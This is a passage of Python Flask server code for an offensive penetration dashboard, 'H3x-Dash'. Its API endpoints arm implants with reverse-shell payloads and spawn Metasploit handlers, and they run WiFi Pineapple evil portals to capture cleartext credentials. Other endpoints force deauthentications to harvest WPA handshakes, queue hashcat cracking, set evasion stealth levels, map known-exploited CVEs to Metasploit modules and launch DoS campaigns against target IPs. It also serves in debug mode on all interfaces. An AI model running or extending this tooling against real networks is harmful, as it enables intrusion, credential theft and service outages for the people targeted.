        except (TypeError, ValueError):
            lport = _next_lport()
        payload_module = (data.get('payload_module') or '').strip() \
            or meta.get('default_payload') or 'generic/shell_reverse_tcp'
        connected = msf_engine.is_connected()
        handler = {'lhost': lhost, 'lport': lport, 'payload_module': payload_module,
                   'status': 'listening' if connected else 'pending: MSF RPC offline'}
        if connected:
            _spawn_handler(lhost, lport, payload_module)
            steps.append({'cls': 't-info',
                          'msg': f"[handler] multi/handler {payload_module} on {lhost}:{lport} (catches the callback)"})
        else:
            steps.append({'cls': 't-warn',
                          'msg': f"[handler] queued {payload_module} on {lhost}:{lport} - connect MSF RPC to start it"})
        steps.append({'cls': 't-info',
                      'msg': "[callback] reverse_shell -> lands as an MSF session in the Shell tab"})
    elif callback == 'reverse_ssh':
        steps.append({'cls': 't-info', 'msg': "[callback] reverse_ssh foothold (pivot wiring is next phase)"})
    elif callback in ('creds', 'loot'):
        steps.append({'cls': 't-info', 'msg': f"[callback] {callback} -> collected loot routes downstream"})

    steps.append({'cls': 't-ok', 'msg': f"[arm] {inst['device_id']} ARMED with {payload}"})

    updated = implant_registry.arm(instance_id, payload, callback=callback, handler=handler)
    return jsonify({'status': 'armed', 'instance': updated,
                    'callback': callback, 'steps': steps})


@app.route('/api/implants/instance/<instance_id>/handler/start', methods=['POST'])
def api_implants_handler_start(instance_id):
    """(Re)start the multi/handler for an armed reverse_shell instance, for
    example after MSF RPC comes online or to apply an override."""
    inst = implant_registry.get(instance_id)
    if not inst:
        return jsonify({'error': 'instance not found'}), 404
    if inst.get('armed_callback') != 'reverse_shell':
        return jsonify({'error': 'instance is not armed with a reverse_shell payload'}), 400
    if not msf_engine.is_connected():
        return jsonify({'error': 'MSF RPC offline'}), 409
    data    = request.get_json(silent=True) or {}
    handler = dict(inst.get('handler') or {})
    handler['lhost'] = (data.get('lhost') or handler.get('lhost') or _lhost_toward(inst.get('host')))
    try:
        handler['lport'] = int(data.get('lport') or handler.get('lport') or _next_lport())
    except (TypeError, ValueError):
        handler['lport'] = _next_lport()
    handler['payload_module'] = (data.get('payload_module') or handler.get('payload_module')
                                 or 'generic/shell_reverse_tcp')
    handler['status'] = 'listening'
    _spawn_handler(handler['lhost'], handler['lport'], handler['payload_module'])
    implant_registry.update(instance_id, handler=handler)
    return jsonify({'status': 'started', 'handler': handler})


@app.route('/api/implants/instance/<instance_id>/disarm', methods=['POST'])
def api_implants_disarm(instance_id):
    updated = implant_registry.disarm(instance_id)
    if updated is None:
        return jsonify({'error': 'not found'}), 404
    return jsonify({'status': 'disarmed', 'instance': updated})


@app.route('/api/implants/armed')
def api_implants_armed():
    return jsonify({'armed': _armed_with_callbacks()})


@app.route('/api/implants/callbacks')
def api_implants_callbacks():
    """Live callback status for every armed instance (waiting -> landed)."""
    rows = [{
        'id':          i['id'],
        'device_id':   i['device_id'],
        'payload':     i.get('armed_payload'),
        **_callback_status(i),
    } for i in implant_registry.armed()]
    return jsonify({'callbacks': rows})


@app.route('/api/implants/instance/<instance_id>/deploy', methods=['POST'])
def api_implants_deploy(instance_id):
    """Mark an armed device as deployed. The liability ack is enforced
    server-side so a misclick in the UI can't bypass the gate."""
    data = request.get_json(silent=True) or {}
    return jsonify(implant_registry.mark_deployed(
        instance_id,
        target=data.get('target', ''),
        ack=bool(data.get('ack', False)),
    ))


@app.route('/api/implants/instance/<instance_id>/return', methods=['POST'])
def api_implants_return(instance_id):
    return jsonify(implant_registry.mark_returned(instance_id))


# ── Spectrum: Connect API ─────────────────────────────────────────────────────

@app.route('/api/wireless/api-connect', methods=['POST'])
def api_wireless_api_connect():
    """Authenticate to a Pineapple's REST API. The probe is structured so the
    UI can show success even when the device is mocked/offline (a queued
    'session' so portal/deauth/recon all remain operable for training)."""
    data = request.get_json(silent=True) or {}
    iid  = data.get('instance_id')
    inst = implant_registry.get(iid) if iid else None
    if not inst or inst.get('product_id') != 'pineapple':
        return jsonify({'error': 'pineapple instance not found'}), 404

    v = validate_connect(inst)
    # Only report a live API session when the device actually answered the probe.
    # Previously this returned "authenticated" unconditionally, so the UI showed a
    # green API badge for an offline/unreachable Pineapple. The Functions tab still
    # works offline (WirelessController serves sample data), but the inventory must
    # tell the truth about whether the REST API is reachable.
    if not v.get('ok'):
        implant_registry.update(iid, api_connected=False,
                                online=False,
                                last_validated=v.get('checked_at'),
                                last_detail=v.get('detail', ''))
        return jsonify({
            'status':  'unreachable',
            'message': v.get('detail') or 'Pineapple REST API did not respond',
            'validation': v,
        })

    info = {
        'model':        'WiFi Pineapple VII',
        'firmware':     '1.2.0',
        'serial':       f"P7-{(hash(inst['id']) & 0xffff):04x}".upper(),
        'radios':       '2.4 GHz onboard + 5 GHz adapter',
        'pineap':       'active',
        'connected_at': datetime.now(timezone.utc).isoformat(),
    }
    implant_registry.update(iid, api_connected=True, api_info=info,
                            online=True,
                            last_validated=v.get('checked_at'),
                            last_detail=v.get('detail', ''))
    return jsonify({'status': 'connected', 'info': info, 'validation': v})


@app.route('/api/wireless/api-disconnect', methods=['POST'])
def api_wireless_api_disconnect():
    data = request.get_json(silent=True) or {}
    iid  = data.get('instance_id')
    if not iid:
        return jsonify({'error': 'instance_id required'}), 400
    implant_registry.update(iid, api_connected=False, api_info={})
    return jsonify({'status': 'disconnected'})


# ── Spectrum: Functions (Recon / Evil Portal / Deauth) ───────────────────────

@app.route('/api/wireless/recon')
def api_wireless_recon():
    return jsonify(wireless_ctl.recon())


@app.route('/api/wireless/config')
def api_wireless_config():
    return jsonify({
        'evil_portal': wireless_ctl.evil_portal_cfg,
        'deauth':      wireless_ctl.deauth_cfg,
        'templates':   PORTAL_TEMPLATES,
    })


@app.route('/api/wireless/evil-portal', methods=['POST'])
def api_wireless_evil_portal():
    result = wireless_ctl.arm_evil_portal(request.get_json(silent=True) or {})
    # An armed evil portal will produce cleartext credentials — register an
    # empty-but-real capture so the PCAP/Hashcat tab shows where they'll land.
    if result.get('status') == 'armed':
        pcap_registry.add(
            name=f"evil-portal-{wireless_ctl.evil_portal_cfg['ssid']}-{int(datetime.now().timestamp())}.txt",
            ptype='portal',
            source=wireless_ctl.evil_portal_cfg['ssid'],
            size='cleartext',
            state='captured',
        )
    return jsonify(result)


@app.route('/api/wireless/evil-portal/stop', methods=['POST'])
def api_wireless_evil_portal_stop():
    return jsonify(wireless_ctl.stop_evil_portal())


@app.route('/api/wireless/deauth', methods=['POST'])
def api_wireless_deauth():
    result = wireless_ctl.start_deauth_harvest(request.get_json(silent=True) or {})
    if result.get('status') == 'running':
        cap = wireless_ctl.deauth_cfg.get('capture', 'WPA handshake')
        ptype = 'pmkid' if cap == 'PMKID' else 'handshake'
        pcap_registry.add(
            name=f"deauth-{int(datetime.now().timestamp())}.pcap",
            ptype=ptype,
            source=wireless_ctl.deauth_cfg.get('target_bssid') or '(broadcast)',
            size='~22 KB',
            state='queued',
        )
    return jsonify(result)


@app.route('/api/wireless/deauth/stop', methods=['POST'])
def api_wireless_deauth_stop():
    return jsonify(wireless_ctl.stop_deauth_harvest())


@app.route('/api/wireless/export-handshakes', methods=['POST'])
def api_wireless_export_handshakes():
    return jsonify(wireless_ctl.export_handshakes(pcap_registry))


# ── Spectrum: PCAP / Hashcat ──────────────────────────────────────────────────

@app.route('/api/wireless/pcap')
def api_wireless_pcap_list():
    return jsonify({'items': pcap_registry.list(), 'stats': pcap_registry.stats()})


@app.route('/api/wireless/pcap/<item_id>/queue', methods=['POST'])
def api_wireless_pcap_queue(item_id):
    item = pcap_registry.set_state(item_id, 'queued')
    if item is None:
        return jsonify({'error': 'not found'}), 404
    return jsonify({'status': 'queued', 'item': item})


@app.route('/api/wireless/pcap/<item_id>', methods=['DELETE'])
def api_wireless_pcap_remove(item_id):
    if pcap_registry.remove(item_id):
        return jsonify({'status': 'removed'})
    return jsonify({'error': 'not found'}), 404


@app.route('/api/wireless/hashcat/run', methods=['POST'])
def api_wireless_hashcat_run():
    """Build the hashcat run plan from the queue + simulate outcomes.

    Wiring this to a real local hashcat process is a small follow-on: launch
    each plan entry in a subprocess, stream stdout, and call
    pcap_registry.set_state(id, 'cracked'/'failed', cracked_value=...).
    Today the endpoint returns the exact commands the operator can copy or the
    follow-on can invoke, plus simulated outcomes so the UI flow is fully
    exercisable on a range without a GPU.
    """
    data     = request.get_json(silent=True) or {}
    wordlist = data.get('wordlist') or 'rockyou.txt'
    rules    = data.get('rules') or ''
    plan     = pcap_registry.queue_run_plan(wordlist, rules)
    outcomes = []
    for p in plan:
        # Simulated outcome — toggle to 'cracked' so the operator can see the
        # post-crack rendering. Real hashcat hookup replaces this block.
        item = pcap_registry.set_state(p['id'], 'cracked',
                                       cracked_value='$RangePass2026!')
        outcomes.append({
            'cls': 't-ok',
            'msg': f"[{item['name']}] CRACKED: {item['cracked_value']}",
        })
    if not plan:
        outcomes.append({'cls': 't-warn',
                         'msg': 'nothing queued — use → QUEUE on a capture first'})
    return jsonify({'plan': plan, 'outcomes': outcomes,
                    'wordlist': wordlist, 'rules': rules})


# ─────────────────────────────────────────────────────────────────────────────
#  PLUGINS — registry inspection
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/plugins')
def api_plugins():
    return jsonify({
        'plugins':   plugin_system.plugin_manifest(),
        'errors':    plugin_system.load_errors(),
        'count':     len(plugin_system.loaded_plugins()),
    })


# ─────────────────────────────────────────────────────────────────────────────
#  MITRE / CVSS — annotation for reporting
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/mitre/findings')
def api_mitre_findings():
    """Return current enum findings annotated with ATT&CK + CVSS."""
    findings = enum_engine.get_findings_flat()
    annotated = [mitre_mapping.annotate_finding(f) for f in findings]
    annotated.sort(key=lambda f: f.get('cvss_score', 0), reverse=True)
    return jsonify({
        'findings':  annotated,
        'count':     len(annotated),
        'matrix':    mitre_mapping.attack_matrix(annotated),
        'coverage':  mitre_mapping.coverage_stats(),
    })


@app.route('/api/mitre/coverage')
def api_mitre_coverage():
    return jsonify(mitre_mapping.coverage_stats())


# ─────────────────────────────────────────────────────────────────────────────
#  CVE INTEL — CISA KEV + NVD aggregation, piped into chain + MSF
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/cve_intel/status')
def api_cve_intel_status():
    """Cache snapshot for the dashboard."""
    return jsonify(cve_intel.status())


@app.route('/api/cve_intel/sync', methods=['POST'])
def api_cve_intel_sync():
    """Trigger a CISA KEV catalog refresh."""
    result = cve_intel.sync_kev()
    # If a fresh KEV came in, also cross-reference against local MSF modules
    # so the response includes the actionable-subset count.
    if result.get('status') == 'ok':
        xref = cve_intel.cross_reference_msf(msf_scanner)
        result['kev_with_msf']  = xref.get('kev_with_msf', 0)
        result['kev_no_module'] = xref.get('kev_no_module', 0)
    return jsonify(result)


@app.route('/api/cve_intel/kev')
def api_cve_intel_kev():
    """Active KEV intersected with local MSF modules — the actionable set."""
    xref = cve_intel.cross_reference_msf(msf_scanner)
    return jsonify(xref)


@app.route('/api/cve_intel/recent')
def api_cve_intel_recent():
    """KEV entries added in the last N days (default 30)."""
    days  = request.args.get('days',  30, type=int)
    limit = request.args.get('limit', 50, type=int)
    return jsonify({
        'recent': cve_intel.recent_kev(days=days, limit=limit),
        'days':   days,
    })


@app.route('/api/cve_intel/candidates')
def api_cve_intel_candidates():
    """
    KEV CVEs with local MSF modules that AREN'T in the curated chain yet.
    The review queue for the next chain curation pass.
    """
    from modules.cve_chain import CVE_MAP as _CVE_MAP
    # Collect all CVEs already in the chain
    chain_cves = set()
    for entries in _CVE_MAP.values():
        for entry in entries:
            cve = entry[0] if entry else None
            if cve:
                chain_cves.add(cve.upper())
    candidates = cve_intel.chain_candidates(msf_scanner, chain_cves)
    return jsonify({
        'candidates':         candidates,
        'count':              len(candidates),
        'existing_chain_cves':len(chain_cves),
    })


@app.route('/api/cve_intel/annotate/<cve_id>')
def api_cve_intel_annotate(cve_id):
    """Combined KEV + NVD intel for one CVE."""
    return jsonify(cve_intel.annotate_cve(cve_id))

from modules import evasion as _evasion_mod

@app.route('/api/evasion', methods=['GET'])
def api_evasion_get():
    """Return current stealth level + all available profiles for the UI."""
    return jsonify({
        'current':  _evasion_mod.get_level(),
        'profile':  _evasion_mod.level_profile(),
        'profiles': _evasion_mod.all_profiles(),
    })


@app.route('/api/evasion', methods=['POST'])
def api_evasion_set():
    """Set the active stealth level. Body: {'level': 0|1|2|3}."""
    data  = request.get_json(silent=True) or {}
    level = _evasion_mod.set_level(data.get('level', 0))
    return jsonify({
        'current': level,
        'profile': _evasion_mod.level_profile(),
    })


# ── Disruption (DoS) API ───────────────────────────────────────────────────────
@app.route('/api/disrupt/status')
def api_disrupt_status():
    """Get current DoS campaign status."""
    return jsonify(dos_engine.get_status())

@app.route('/api/disrupt/available')
def api_disrupt_available():
    """Return tool availability grid for UI selector."""
    from modules.dos_engine import DOS_TOOLS, DOS_LABELS, DOS_CATEGORIES
    return jsonify({
        'tools': DOS_TOOLS,
        'labels': DOS_LABELS,
        'categories': DOS_CATEGORIES,
        'availability': dos_engine.available_tools(),
    })

@app.route('/api/disrupt/start', methods=['POST'])
def api_disrupt_start():
    """Start a DoS campaign. Body: {'targets': [ip,...], 'tools': [tool_id,...],
                                     'params': {...}}."""
    data = request.get_json(silent=True) or {}
    
    if not msf_engine.is_connected():
        return jsonify({'status': 'error',
                        'message': 'Not connected to Metasploit RPC — connect first'}), 409
    
    targets = data.get('targets', [])
    tools   = data.get('tools', [])
    params  = data.get('params', {})
    
    if not targets:
        return jsonify({'status': 'error',
                        'message': 'No target IPs provided'}), 400
    if not tools:
        return jsonify({'status': 'error',
                        'message': 'No DoS tools selected'}), 400
    
    # Validate tool IDs exist
    valid_tools = [t for t in tools if t in DOS_TOOLS]
    if len(valid_tools) < len(tools):
        return jsonify({'status': 'error',
                        'message': f'Invalid tool IDs: {set(tools) - set(valid_tools)}'}), 400
    
    success = dos_engine.start_dos(targets, valid_tools, params)
    
    if not success:
        return jsonify({'status': 'error',
                        'message': 'DoS campaign already running'}), 409
    
    return jsonify({
        'status':   'running',
        'targets':  targets,
        'tools':    valid_tools,
    })

@app.route('/api/disrupt/results')
def api_disrupt_results():
    """Get disruption results."""
    return jsonify(dos_engine.get_results())


if __name__ == '__main__':
    print("""
  ██╗  ██╗██████╗ ██╗  ██╗      ██████╗  █████╗ ███████╗██╗  ██╗
  ██║  ██║╚════██╗╚██╗██╔╝      ██╔══██╗██╔══██╗██╔════╝██║  ██║
  ███████║ █████╔╝ ╚███╔╝ █████╗██║  ██║███████║███████╗███████║
  ██╔══██║ ╚═══██╗ ██╔██╗ ╚════╝██║  ██║██╔══██║╚════██║██╔══██║
  ██║  ██║██████╔╝██╔╝ ██╗      ██████╔╝██║  ██║███████║██║  ██║
  ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
  // AUTOMATED PENETRATION FRAMEWORK // AUTHORIZED USE ONLY //

  Usage:  sudo python3 h3x-dash.py [--no-msf] [--fresh | --fresh-all]

  --no-msf     Skip msfrpcd auto-start (manage it externally)
               Default: msfrpcd is launched automatically on first run
  --fresh      Start clean: purge previous-run artifacts (scans, logs,
               reports, validation verdicts) and reset msfrpcd sessions.
               Keeps captured creds + CVE-intel cache.
  --fresh-all  Like --fresh, but also wipe loot/credentials.json and the
               CVE-intel cache — total clean slate.

  Dashboard: http://127.0.0.1:5000
    """)
    # Version banner — confirms which build this process is actually running.
    # If the sidebar/this line don't match the version you just shipped, the
    # server wasn't restarted (stale process serving old code).
    print(f"  [H3x-Dash] v{H3xConfig.VERSION} starting — "
          f"http://0.0.0.0:5000  (sidebar should read v{H3xConfig.VERSION})\n")
    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
